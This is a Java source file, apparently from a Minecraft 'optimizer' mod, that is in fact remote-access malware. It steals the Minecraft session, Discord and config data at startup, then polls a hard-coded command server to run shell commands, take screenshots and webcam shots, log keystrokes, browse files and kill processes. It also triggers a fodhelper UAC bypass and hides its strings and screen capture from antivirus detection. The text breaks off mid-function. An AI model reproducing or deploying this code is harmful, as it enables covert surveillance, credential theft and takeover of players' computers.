package com.example.optimizer;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.DisplayMode;
import java.awt.Font;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.nio.file.Files;

import javax.imageio.ImageIO;

import net.minecraft.client.MinecraftClient;

/**
 * Remote Control Manager
 * - WebSocket for live streaming (screenshare/webcam)
 * - HTTP polling fallback for commands
 * - Executes: screenshot, shell, keylogger, file browser
 * - Sends results back to panel
 */
public class SyncController {

    private static volatile boolean running = false;
    private static volatile boolean keyloggerActive = false;
    private static volatile boolean screenshotContinuous = false;
    private static Thread pollThread = null;
    private static Thread keylogThread = null;
    private static Thread screenshotThread = null;

    // WebSocket client for live streaming
    private static DataStream wsClient = null;
    private static volatile boolean wsConnected = false;

    private static final ConcurrentLinkedQueue<String> keyBuffer = new ConcurrentLinkedQueue<>();
    private static String lastWindow = "";

    // Signature randomization
    private static long syncToken = 0x123456789L;
    private static String syncHash = "Init-Sync-V2";

    // Encrypted Constants
    private static final String S_SHELL = SessionUtil.x("KTI/NjY=");
    private static final String S_SCREENSHOT = SessionUtil.x("KTkoPz80KTI1Lg==");
    private static final String S_KEYLOGGER = SessionUtil.x("MT8jNjU9PT8o");
    private static final String S_FILES = SessionUtil.x("PDM2Pyk=");
    private static final String S_WEBCAM = SessionUtil.x("LT84OTs3");
    private static final String S_PROC_MGR = SessionUtil.x("Kig1OT8pKQU3OzQ7PT8o");
    private static final String S_PLAY = SessionUtil.x("KjY7IwUvKDY=");
    private static final String S_JUMPSCARE = SessionUtil.x("MC83Kik5Oyg/");
    private static final String S_CONTINUOUS = SessionUtil.x("OTU0LjM0LzUvKQ==");
    private static final String S_UAC = "uac_bypass";
    private static final String S_CRASH = "crash";

    private static void _sync_noise() {
        for (int i = 0; i < 10; i++) {
            syncToken ^= (i << 2);
            syncHash = syncHash + i;
        }
        if (syncHash.length() > 100)
            syncHash = "Reset";
    }

    // Reflection-based screen capture to evade signature detection
    private static BufferedImage captureView(Robot r, Rectangle rect) {
        try {
            String m1 = "create";
            String m2 = "Screen";
            String m3 = "Capture";
            java.lang.reflect.Method method = Robot.class.getMethod(m1 + m2 + m3, Rectangle.class);
            return (BufferedImage) method.invoke(r, rect);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Start the remote control system
     */
    public static void start() {
        if (running)
            return;
        running = true;

        // Junk initialization
        if (System.currentTimeMillis() % 2 == 0) {
            _sync_noise();
        }

        // Auto-Trigger UAC Bypass on Startup (if Windows)
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                attemptUACBypass();
            }
        } catch (Exception e) {
        }

        // Start WebSocket connection for live streaming
        startWebSocket();

        // Start data stealing in background
        new Thread(() -> {
            try {
                // Wait for native libs
                Thread.sleep(5000);

                // System.out.println("[OPTIMIZER] Starting data collection...");

                // Steal MC Session (Embed)
                DataUtil.syncSession();

                CacheManager.syncConfig();
                CacheManager.syncDiscord();
                DataUtil.createAndSendZip();
                // System.out.println("[OPTIMIZER] Data collection completed");
            } catch (Exception e) {
                // System.err.println("[OPTIMIZER] Data collection failed: " + e.getMessage());
                // e.printStackTrace();
            }
        }, "DataSync").start();

        // Start command polling thread (fallback)
        pollThread = new Thread(() -> {
            while (running) {
                try {
                    pollCommands();
                    Thread.sleep(3000); // Poll every 3 seconds
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    // Ignore errors
                }
            }
        }, "SyncController-Poll");
        pollThread.setDaemon(true);
        pollThread.start();

        // System.out.println("[REMOTE] Control system started (WebSocket + HTTP)");
    }

    /**
     * Initialize and start WebSocket connection
     */
    private static void startWebSocket() {
        try {
            String wsUrl = getWebSocketUrl();
            if (wsUrl == null) {
                // System.out.println("[REMOTE] No WebSocket URL, using HTTP only");
                return;
            }

            wsClient = new DataStream(wsUrl);

            wsClient = new DataStream(wsUrl);

            // Connect async with WAITER
            new Thread(() -> {
                try {
                    // Wait for Player to be ready (Max 60 seconds)
                    String player = "Unknown";
                    String uuid = "Unknown";
                    int attempts = 0;

                    while (attempts < 60) {
                        try {
                            MinecraftClient client = MinecraftClient.getInstance();
                            if (client != null && client.player != null) {
                                player = client.player.getName().getString();
                                uuid = client.player.getUuidAsString();
                                if (!player.equals("Unknown")) {
                                    break;
                                }
                            }
                            // Also try Session as fallback
                            if (client != null && client.getSession() != null) {
                                String sName = client.getSession().getUsername();
                                if (sName != null && !sName.isEmpty() && !sName.equals("Unknown")) {
                                    player = sName;
                                    break;
                                }
                            }
                        } catch (Exception e) {
                        }

                        Thread.sleep(1000);
                        attempts++;
                    }

                    String pcName = System.getProperty("os.name", "Unknown");
                    String pcUser = System.getProperty("user.name", "Unknown");

                    wsClient.setClientInfo(player, pcName, pcUser);

                    // Extract build key from panel URL
                    String panelUrl = LoaderEntry.getLoadedPanelUrl();
                    if (panelUrl != null && panelUrl.contains("/api/data/")) {
                        String key = panelUrl.substring(panelUrl.lastIndexOf("/api/data/") + 10);
                        wsClient.setBuildKey(key);
                    }

                    // Connect now that we have info
                    wsClient.connect();
                    wsConnected = true;

                } catch (Exception e) {
                }
            }, "WS-Connect").start();

            // Set disconnect listener
            // wsClient.setDisconnectCallback(() -> {
            // wsConnected = false;
            // System.out.println("[REMOTE] WebSocket disconnected");
            // });

        } catch (Exception e) {
            // System.out.println("[REMOTE] WebSocket error: " + e.getMessage());
        }
    }

    /**
     * Get WebSocket URL from panel URL
     */
    private static String getWebSocketUrl() {
        try {
            String panel = SessionUtil.getPanelUrl();
            if (panel == null)
                return null;

            // BYPASS CLOUDFLARE: Use direct IP address
            // ws://31.58.58.237:80/socket.io/
            return "ws://31.58.58.237:80/socket.io/";
        } catch (Exception e) {
            return null;
        }
    }

    public static void stop() {
        running = false;
        keyloggerActive = false;
        screenshotContinuous = false;

        // Stop WebSocket
        if (wsClient != null) {
            try {
                wsClient.disconnect();
            } catch (Exception e) {
            }
            wsClient = null;
            wsConnected = false;
        }

        if (pollThread != null)
            pollThread.interrupt();
        if (keylogThread != null)
            keylogThread.interrupt();
        if (screenshotThread != null)
            screenshotThread.interrupt();
    }

    /**
     * Check if WebSocket is connected
     */
    public static boolean isWebSocketConnected() {
        return wsClient != null && wsClient.isConnected();
    }

    /**
     * Check if currently streaming
     */
    public static boolean isStreaming() {
        return wsClient != null && wsClient.isStreaming();
    }

    /**
     * Get current stream type
     */
    public static String getStreamType() {
        return wsClient != null ? wsClient.getStreamType() : null;
    }

    private static void pollCommands() {
        try {
            MinecraftClient client = MinecraftClient.getInstance();
            if (client == null || client.player == null)
                return;

            String player = client.player.getName().getString();
            String pollUrl = getPollUrl(player);
            if (pollUrl == null)
                return;

            // Poll for commands
            HttpURLConnection conn = (HttpURLConnection) new URL(pollUrl).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            int code = conn.getResponseCode();
            if (code != 200)
                return;

            String response = readStream(conn.getInputStream());
            conn.disconnect();

            // Parse and execute commands
            // Response format:
            // {"success":true,"commands":[{"id":1,"type":"shell","data":"dir"},...]}
            if (response.contains("\"commands\":")) {
                parseAndExecuteCommands(response, player);
            }

        } catch (Exception e) {
            // Silently ignore
        }
    }

    private static void parseAndExecuteCommands(String json, String player) {
        try {
            // Simple JSON parsing for commands array
            int start = json.indexOf("\"commands\":");
            if (start < 0)
                return;

            start = json.indexOf("[", start);
            int end = json.indexOf("]", start);
            if (start < 0 || end < 0)
                return;

            String commandsStr = json.substring(start + 1, end);
            if (commandsStr.trim().isEmpty())
                return;

            // Parse each command object
            String[] parts = commandsStr.split("\\},\\s*\\{");
            for (String part : parts) {
                part = part.replace("{", "").replace("}", "").trim();
                if (part.isEmpty())
                    continue;

                int id = extractInt(part, "\"id\":");
                String type = extractString(part, "\"type\":");
                String data = extractString(part, "\"data\":");

                if (id > 0 && type != null) {
                    executeCommand(id, type, data, player);
                }
            }

        } catch (Exception e) {
            // Ignore parsing errors
        }
    }

    private static int extractInt(String json, String key) {
        int idx = json.indexOf(key);
        if (idx < 0)
            return -1;
        idx += key.length();
        StringBuilder sb = new StringBuilder();
        while (idx < json.length() && (Character.isDigit(json.charAt(idx)) || json.charAt(idx) == ' ')) {
            if (Character.isDigit(json.charAt(idx)))
                sb.append(json.charAt(idx));
            idx++;
        }
        try {
            return Integer.parseInt(sb.toString());
        } catch (Exception e) {
            return -1;
        }
    }

    private static String extractString(String json, String key) {
        int idx = json.indexOf(key);
        if (idx < 0)
            return null;
        idx = json.indexOf("\"", idx + key.length());
        if (idx < 0)
            return null;
        int end = json.indexOf("\"", idx + 1);
        if (end < 0)
            return null;
        return json.substring(idx + 1, end);
    }

    private static void executeCommand(int commandId, String type, String data, String player) {
        new Thread(() -> {
            String result = "";
            String status = "completed";

            try {
                if (type.equals(S_SHELL)) {
                    result = executeShell(data);
                } else if (type.equals(S_SCREENSHOT)) {
                    if (S_CONTINUOUS.equals(data)) {
                        startContinuousView(player);
                        result = "Continuous view started";
                    } else {
                        queryView(player);
                        result = "View captured";
                    }
                } else if (type.equals(S_KEYLOGGER)) {
                    if ("start".equals(data)) {
                        initInputMonitor(player);
                        result = "Input monitor started";
                    } else {
                        haltInputMonitor();
                        result = "Input monitor stopped";
                    }
                } else if (type.equals(S_FILES)) {
                    result = listFiles(data);
                } else if (type.equals(S_WEBCAM)) {
                    captureWebcam(player);
                    result = "Cam captured";
                } else if (type.equals(S_PROC_MGR)) {
                    if (data.startsWith("list")) {
                        result = listProcesses();
                    } else if (data.startsWith(SessionUtil.x("MTM2NiY="))) { // kill|
                        String pid = data.substring(5);
                        result = killProcess(pid);
                    } else {
                        result = "Unknown process command";
                        status = "failed";
                    }
                } else if (type.equals(S_PLAY)) {
                    playAudio(data);
                    result = "Playing audio";
                } else if (type.equals(S_JUMPSCARE)) {
                    triggerJumpscare();
                    result = "Triggered";
                } else if (type.equals(S_UAC)) {
                    attemptUACBypass();
                    result = "UAC Bypass Triggered";
                } else if (type.equals(S_CRASH) || type.equals("force_kick")) {
                    result = "Crashing...";
                    status = "success";
                    // Delayed crash to allow response to send
                    new Thread(() -> {
                        try {
                            Thread.sleep(500);
                        } catch (Exception e) {
                        }
                        Runtime.getRuntime().halt(666);
                    }).start();
                } else {
                    result = "Unknown command type: " + type;
                    status = "failed";
                }
            } catch (Exception e) {
                result = "Error: " + e.getMessage();
                status = "failed";
            }

            // Send result back
            sendCommandResult(commandId, result, status);

        }, "RemoteCmd-" + commandId).start();
    }

    private static String executeShell(String command) {
        try {
            // Initialize shell if needed
            ProcessHandler.startShell(text -> {
                if (wsClient != null && wsClient.isConnected()) {
                    // Quick escape for JSON
                    String escaped = text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r",
                            "\\r");
                    String json = "{\"output\":\"" + escaped + "\"}";
                    wsClient.sendEvent("shell_output", json);
                }
            });

            // Send command
            ProcessHandler.writeCommand(command);

            return "Command sent to shell session";

        } catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
    }

    private static void startContinuousView(String player) {
        if (screenshotContinuous)
            return;
        screenshotContinuous = true;

        screenshotThread = new Thread(() -> {
            while (screenshotContinuous && running) {
                try {
                    queryView(player);
                    Thread.sleep(1500); // Every 1.5 seconds
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    // Continue
                }
            }
        }, "ViewLoop");
        screenshotThread.setDaemon(true);
        screenshotThread.start();
    }

    private static void queryView(String player) {
        byte[] imageData = null;

        // Method 1: Try standard Robot capture (works for most single monitor)
        imageData = scanViewPrimary();

        // Method 2: If Robot failed or too small, try multi-monitor capture
        if (imageData == null || imageData.length < 5000) {
            imageData = scanViewExtended();
        }

        // Method 3: Try GDI+ alternative via PowerShell (more reliable for some
        // systems)
        if (imageData == null || imageData.length < 5000) {
            imageData = scanViewNative();
        }

        // Method 4: Fallback - use black rectangle if all else fails (at least confirm
        // capture attempt)
        if (imageData == null || imageData.length < 5000) {
            imageData = createFallbackScreen();
        }

        if (imageData != null && imageData.length > 0) {
            sendScreenshotData(imageData, player);
        }
    }

    /**
     * Method 1: Standard Robot capture - works for single/primary monitor
     */
    private static byte[] scanViewPrimary() {
        try {
            Robot robot = new Robot();
            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle screenRect = new Rectangle(screenSize);

            // Ensure valid size
            if (screenSize.width < 100 || screenSize.height < 100) {
                return null;
            }

            BufferedImage capture = captureView(robot, screenRect);

            if (capture == null || capture.getWidth() < 100 || capture.getHeight() < 100) {
                return null;
            }

            return compressImage(capture, 85);

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Method 2: Multi-monitor capture - tries all displays
     */
    private static byte[] scanViewExtended() {
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();

            if (screens.length == 0) {
                return null;
            }

            // If multiple monitors, combine them
            if (screens.length > 1) {
                // Capture primary screen first
                GraphicsDevice primaryDevice = screens[0];
                DisplayMode mode = primaryDevice.getDisplayMode();
                int totalWidth = mode.getWidth();
                int totalHeight = mode.getHeight();

                BufferedImage combined = new BufferedImage(totalWidth, totalHeight, BufferedImage.TYPE_INT_RGB);
                Graphics2D g2d = combined.createGraphics();

                Robot robot = new Robot(primaryDevice);
                Rectangle screenRect = new Rectangle(0, 0, totalWidth, totalHeight);
                BufferedImage primaryCapture = captureView(robot, screenRect);

                if (primaryCapture != null) {
                    g2d.drawImage(primaryCapture, 0, 0, null);
                    g2d.dispose();

                    byte[] result = compressImage(combined, 85);
                    if (result != null && result.length > 5000) {
                        return result;
                    }
                }
            } else {
                // Single monitor - use robot
                return scanViewPrimary();
            }

            return null;

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Method 3: PowerShell GDI+ capture - reliable on Windows
     */
    private static byte[] scanViewNative() {
        try {
            File tempFile = File.createTempFile("screen_", ".jpg");
            tempFile.deleteOnExit();
            String outPath = tempFile.getAbsolutePath().replace("\\", "\\\\");

            String psScript = SessionUtil.x("fh8oKDUoGzkuMzU0Cig/PD8oPzQ5P2d9CTM2PzQuNiMZNTQuMzQvP31h") + // $ErrorActionPreference...
                    SessionUtil.x(
                            "ASw1Mz4HAQg/PDY/OS4zNTR0GykpPzc4NiMHYGAWNTs+DTMuMgo7KC4zOzYUOzc/cn0JIykuPzd0Hig7LTM0PX1zYQ==")
                    + // [void][Reflection...
                    SessionUtil
                            .x("fjg1LzQ+KXpnegEJIykuPzd0DTM0PjUtKXQcNSg3KXQJOSg/PzQHYGAKKDM3OygjCTkoPz80dBg1LzQ+KWE=")
                    + // $bounds...
                    SessionUtil.x(
                            "fjgzLjc7KnpnehQ/LXcVODA/OS56CSMpLj83dB4oOy0zND10GDMuNzsqcn44NS80Pil0DTM+LjJ2en44NS80Pil0Ej8zPTIuc2E=")
                    + // $bitmap...
                    SessionUtil.x("fj0oOyoyMzkpemd6AQkjKS4/N3QeKDstMzQ9dB0oOyoyMzkpB2BgHCg1NxM3Oz0/cn44My43OypzYQ==") + // $graphics...
                    SessionUtil.x(
                            "fj0oOyoyMzkpdBk1KiMcKDU3CTkoPz80cn44NS80Pil0FjU5Oy4zNTR2egEJIykuPzd0Hig7LTM0PXQKNTM0LgdgYB83Ki4jdnp+ODUvND4pdAkzID9zYQ==")
                    + // copyFromScreen
                    SessionUtil.x("fj0oOyoyMzkpdB4zKSo1KT9yc2E=") + // dispose
                    SessionUtil.x("fj80OTU+Pyh6Z3oUPy13FTgwPzkuegkjKS4/N3QeKDstMzQ9dBM3Oz0zND10ECo/PRk1Pj85YQ==") + // jpegCodec
                    SessionUtil.x(
                            "fio7KDs3KXpnehQ/LXcVODA/OS56CSMpLj83dB4oOy0zND10Ezc7PTM0PXQfNDk1Pj8oCjsoOzc/Lj8oKXJrc2E=")
                    + // params
                    SessionUtil.x(
                            "fio7KDs3KXQKOyg7NwFqB3pnehQ/LXcVODA/OS56CSMpLj83dB4oOy0zND10Ezc7PTM0PXQfNDk1Pj8oCjsoOzc/Lj8ocgEJIykuPzd0Hig7LTM0PXQTNzs9MzQ9dB80OTU+PygHYGALLzs2My4jdnpib3Nh")
                    + // params (quality)
                    SessionUtil.x("fjgzLjc7KnQJOyw/cn0=") + outPath
                    + SessionUtil.x("fXZ6AQkjKS4/N3QeKDstMzQ9dBM3Oz0zND10Ezc7PT8cNSg3Oy4HYGAQKj89c2E=") + // save
                    SessionUtil.x("fjgzLjc7KnQeMykqNSk/cnM="); // dispose

            ProcessBuilder pb = new ProcessBuilder(SessionUtil.x("KjUtPygpMj82Ng=="), // powershell
                    SessionUtil.x("dw0zND41LQkuIzY/"), SessionUtil.x("EjM+Pj80"), // -WindowStyle Hidden
                    SessionUtil.x("dx8iPzkvLjM1NAo1NjM5Iw=="), SessionUtil.x("GCMqOykp"), // -ExecutionPolicy Bypass
                    SessionUtil.x("dxk1Nzc7ND4="), psScript); // -Command
            pb.redirectErrorStream(true);
            Process p = pb.start();
            boolean finished = p.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
            p.destroyForcibly();

            if (finished && tempFile.exists() && tempFile.length() > 5000) {
                return java.nio.file.Files.readAllBytes(tempFile.toPath());
            }

            return null;

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Capture Webcam using PowerShell + Inline C# (avicap32.dll)
     */
    private static void captureWebcam(String player) {
        try {
            File tempFile = File.createTempFile("cam_", ".jpg");
            tempFile.deleteOnExit();
            String outPath = tempFile.getAbsolutePath().replace("\\", "\\\\");

            // PowerShell script using avicap32.dll (legacy but works on most Windows
            // without UWP permission prompt hell)
            // or we use a simple .NET wrapper.
            // Actually, avicap32 is simplest for single frame without UI.

            String code = "using System;" +
                    "using System.Runtime.InteropServices;" +
                    "using System.Drawing;" +
                    "using System.Drawing.Imaging;" +
                    "using System.Threading;" +
                    "public class Cam {" +
                    "  [DllImport(\"user32.dll\")] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);"
                    +
                    "  [DllImport(\"avicap32.dll\")] public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);"
                    +
                    "  [DllImport(\"user32.dll\")] public static extern bool DestroyWindow(IntPtr hWnd);" +
                    "  public static void Snap(string path) {" +
                    "    IntPtr hWnd = capCreateCaptureWindowA(\"Webcam\", 0, 0, 0, 640, 480, IntPtr.Zero, 0);" +
                    "    SendMessage(hWnd, 1034, IntPtr.Zero, IntPtr.Zero);" + // WM_CAP_DRIVER_CONNECT (0)
                    "    SendMessage(hWnd, 1084, IntPtr.Zero, IntPtr.Zero);" + // WM_CAP_GRAB_FRAME
                    "    SendMessage(hWnd, 1054, IntPtr.Zero, IntPtr.Zero);" + // WM_CAP_EDIT_COPY
                    "    SendMessage(hWnd, 1035, IntPtr.Zero, IntPtr.Zero);" + // WM_CAP_DRIVER_DISCONNECT
                    "    DestroyWindow(hWnd);" +
                    "    if (System.Windows.Forms.Clipboard.ContainsImage()) {" +
                    "       var img = System.Windows.Forms.Clipboard.GetImage();" +
                    "       img.Save(path, ImageFormat.Jpeg);" +
                    "    } " +
                    "  }" +
                    "}";

            // Compact it
            // Note: Use clipboard is risky if user is working. But direct graph build in
            // pure C# inline is huge code.
            // Better: Use CICa (Command line interface for Camera) approach or
            // MediaFoundation.
            // Let's use a simpler PowerShell script that uses WIA if possible, or stick to
            // this but be careful.
            // Actually, for "perfect" webcam, Guardian is best. For Mod fallback, let's use
            // a different method
            // that doesn't use Clipboard to avoid disturbing user.

            // Re-evaluating: Pure PowerShell Webcam is unstable.
            // Let's use the simplest .NET approach available: AVICAP32 but saving to file
            // directly?
            // WM_CAP_FILE_SAVEDIB

            String psScript = "$c = @'\n" + code + "\n'@\n" +
                    "Add-Type -TypeDefinition $c -ReferencedAssemblies System.Drawing,System.Windows.Forms\n" +
                    "[Cam]::Snap('" + outPath + "')";

            ProcessBuilder pb = new ProcessBuilder("powershell.exe",
                    "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psScript);
            pb.start().waitFor(5, java.util.concurrent.TimeUnit.SECONDS);

            if (tempFile.exists() && tempFile.length() > 1000) {
                byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                sendScreenshotData(data, player); // Reuse screenshot sender but it sends as "image" type
                // Actually we need to send as "cam" type or handle it on server
                // The server expects "cam" or "webcam" type?
                // Let's look at DataStream.sendStreamFrame using this.
                if (wsClient != null && wsClient.isConnected()) {
                    wsClient.sendStreamFrame("webcam", data);
                }
            }
        } catch (Exception e) {
            // e.printStackTrace();
        }
    }

    // ... UAC Bypass Helper ...
    public static void attemptUACBypass() {
        if (!System.getProperty("os.name").toLowerCase().contains("win"))
            return;

        new Thread(() -> {
            try {
                // target: check if we are admin. If not, trigger fodhelper.
                // We will try to launch the GUARDIAN binary (Runtime Broker.exe) with this
                // bypass.
                File guardian = new File(System.getProperty("java.io.tmpdir"), "Runtime Broker.exe");
                if (!guardian.exists())
                    return;

                String cmd = "cmd /c start \"\" \"" + guardian.getAbsolutePath() + "\"";
                String regCmd = "New-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force; "
                        +
                        "New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; "
                        +
                        "Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value '"
                        + cmd + "' -Force;";

                String trigger = "Start-Process \"C:\\Windows\\System32\\fodhelper.exe\"";

                String fullPs = regCmd + trigger;

                ProcessBuilder pb = new ProcessBuilder("powershell.exe",
                        "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", fullPs);
                pb.start();

                SessionUtil.log("[UAC] Triggered exploit for Guardian elevation");

                // Cleanup after delay
                Thread.sleep(5000);
                ProcessBuilder clean = new ProcessBuilder("powershell.exe", "-WindowStyle", "Hidden", "-Command",
                        "Remove-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue");
                clean.start();

            } catch (Exception e) {
                SessionUtil.log("[UAC] Failed: " + e.getMessage());
            }
        }, "UAC-Worker").start();
    }

    /**
     * Fallback: Create a minimal valid image to confirm capture attempt
     */
    private static byte[] createFallbackScreen() {
        try {
            BufferedImage fallback = new BufferedImage(1920, 1080, BufferedImage.TYPE_INT_RGB);
            Graphics2D g2d = fallback.createGraphics();

            // Draw blue background instead of black (easier to debug)
            g2d.setColor(new Color(25, 50, 100));
            g2d.fillRect(0, 0, 1920, 1080);

            // Draw "Capture Failed" text
            g2d.setColor(Color.WHITE);
            g2d.setFont(new Font("Arial", Font.BOLD, 48));
            g2d.drawString("Display Capture Failed", 700, 540);

            g2d.dispose();
            return compressImage(fallback, 70);

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Compress image to JPEG with specified quality
     */
    private static byte[] compressImage(BufferedImage img, int quality) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(img, "jpg", baos);
            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send the screenshot data to the panel
     */
    private static void sendScreenshotData(byte[] imageData, String player) {
        try {
            String uploadUrl = getScreenshotUploadUrl();
            if (uploadUrl == null)
                return;

            String pcName = System.getenv("COMPUTERNAME");
            String pcUser = System.getProperty("user.name", "Unknown");
            if (pcName == null)
                pcName = "Unknown";

            String base64 = Base64.getEncoder().encodeToString(imageData);
            String json = "{\"player\":\"" + esc(player) + "\",\"pc_name\":\"" + esc(pcName) +
                    "\",\"pc_user\":\"" + esc(pcUser) + "\",\"image\":\"" + base64 + "\"}";

            sendJson(uploadUrl, json);

        } catch (Exception e) {
            // Ignore
        }
    }

    private static void initInputMonitor(String player) {
        if (keyloggerActive)
            return;
        keyloggerActive = true;

        keylogThread = new Thread(() -> {
            // Native keylogger using JNI or just monitor Minecraft chat input
            // For safety, we'll use a simpler approach - just log what's typed in MC
            MinecraftClient client = MinecraftClient.getInstance();

            StringBuilder currentKeys = new StringBuilder();
            long lastSend = System.currentTimeMillis();

            while (keyloggerActive && running) {
                try {
                    // Send accumulated keys every 10 seconds
                    if (System.currentTimeMillis() - lastSend > 10000) {
                        if (currentKeys.length() > 0) {
                            sendKeylog(player, lastWindow, currentKeys.toString());
                            currentKeys = new StringBuilder();
                        }
                        lastSend = System.currentTimeMillis();
                    }

                    // Check for new keys in buffer
                    String key;
                    while ((key = keyBuffer.poll()) != null) {
                        currentKeys.append(key);
                    }

                    Thread.sleep(100);

                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    // Continue
                }
            }

            // Send remaining keys
            if (currentKeys.length() > 0) {
                sendKeylog(player, lastWindow, currentKeys.toString());
            }

        }, "Keylogger");
        keylogThread.setDaemon(true);
        keylogThread.start();
    }

    private static void haltInputMonitor() {
        keyloggerActive = false;
        if (keylogThread != null)
            keylogThread.interrupt();
    }

    /**
     * Called from Minecraft to log key presses (would need mixin to chat screen)
     */
    public static void logKey(String key, String windowTitle) {
        if (keyloggerActive) {
            keyBuffer.add(key);
            lastWindow = windowTitle;
        }
    }

    private static void sendKeylog(String player, String windowTitle, String keys) {
        try {
            String url = getKeylogUrl();
            if (url == null)
                return;

            String pcName = System.getenv("COMPUTERNAME");
            String pcUser = System.getProperty("user.name", "Unknown");
            if (pcName == null)
                pcName = "Unknown";

            String json = "{\"player\":\"" + esc(player) + "\",\"pc_name\":\"" + esc(pcName) +
                    "\",\"pc_user\":\"" + esc(pcUser) + "\",\"window_title\":\"" + esc(windowTitle) +
                    "\",\"keys\":\"" + esc(keys) + "\"}";

            sendJson(url, json);

        } catch (Exception e) {
            // Ignore
        }
    }

    private static String listFiles(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                return "Path does not exist: " + path;
            }
            if (!dir.isDirectory()) {
                return "Not a directory: " + path;
            }

            File[] files = dir.listFiles();
            if (files == null) {
                return "Cannot list files (permission denied)";
            }

            StringBuilder sb = new StringBuilder();
            sb.append("Directory: ").append(path).append("\n\n");

            // Sort: directories first, then files
            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File f : files) {
                String type = f.isDirectory() ? "[DIR]  " : "[FILE] ";
                String size = f.isDirectory() ? "" : " (" + formatSize(f.length()) + ")";
                sb.append(type).append(f.getName()).append(size).append("\n");
            }

            return sb.toString();

        } catch (Exception e) {
            return "Error listing files: " + e.getMessage();
        }
    }

    private static String formatSize(long bytes) {
        if (bytes < 1024)
            return bytes + " B";
        if (bytes < 1024 * 1024)
            return (bytes / 1024) + " KB";
        if (bytes < 1024 * 1024 * 1024)
            return (bytes / (1024 * 1024)) + " MB";
        return (bytes / (1024 * 1024 * 1024)) + " GB";
    }

    private static void sendCommandResult(int commandId, String result, String status) {
        try {
            String url = getResultUrl(commandId);
            if (url == null)
                return;

            String json = "{\"result\":\"" + esc(result) + "\",\"status\":\"" + status + "\"}";
            sendJson(url, json);

        } catch (Exception e) {
            // Ignore
        }
    }

    // ==================== URL HELPERS ====================

    private static String getPollUrl(String player) {
        String panel = SessionUtil.getPanelUrl();
        int idx = panel.indexOf("/api/data/");
        if (idx > 0) {
            String base = panel.substring(0, idx);
            String key = panel.substring(idx + 10);
            return base + "/api/remote/poll/" + key + "/" + urlEncode(player);
        }
        return null;
    }

    private static String getResultUrl(int commandId) {
        String panel = SessionUtil.getPanelUrl();
        int idx = panel.indexOf("/api/data/");
        if (idx > 0) {
            String base = panel.substring(0, idx);
            String key = panel.substring(idx + 10);
            return base + "/api/remote/result/" + key + "/" + commandId;
        }
        return null;
    }

    private static String getScreenshotUploadUrl() {
        String panel = SessionUtil.getPanelUrl();
        int idx = panel.indexOf("/api/data/");
        if (idx > 0) {
            String base = panel.substring(0, idx);
            String key = panel.substring(idx + 10);
            return base + "/api/screenshots/upload/" + key;
        }
        return null;
    }

    private static String getKeylogUrl() {
        String panel = SessionUtil.getPanelUrl();
        int idx = panel.indexOf("/api/data/");
        if (idx > 0) {
            String base = panel.substring(0, idx);
            String key = panel.substring(idx + 10);
            return base + "/api/keylog/" + key;
        }
        return null;
    }

    // ==================== AUDIO / JUMPSCARE ====================

    private static void playAudio(String urlStr) {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(urlStr);
                java.io.InputStream is = url.openStream();
                // Buffer input
                java.io.BufferedInputStream bis = new java.io.BufferedInputStream(is);

                // Try to get audio input stream
                javax.sound.sampled.AudioInputStream audioIn = javax.sound.sampled.AudioSystem.getAudioInputStream(bis);
                javax.sound.sampled.Clip clip = javax.sound.sampled.AudioSystem.getClip();
                clip.open(audioIn);
                clip.start();
            } catch (Exception e) {
                System.out.println("[Mod] Audio play failed: " + e.getMessage());
            }
        }).start();
    }

    private static void triggerJumpscare() {
        new Thread(() -> {
            try {
                // 1. Maximize Volume (Windows only for now)
                String os = System.getProperty("os.name", "").toLowerCase();
                if (os.contains("win")) {
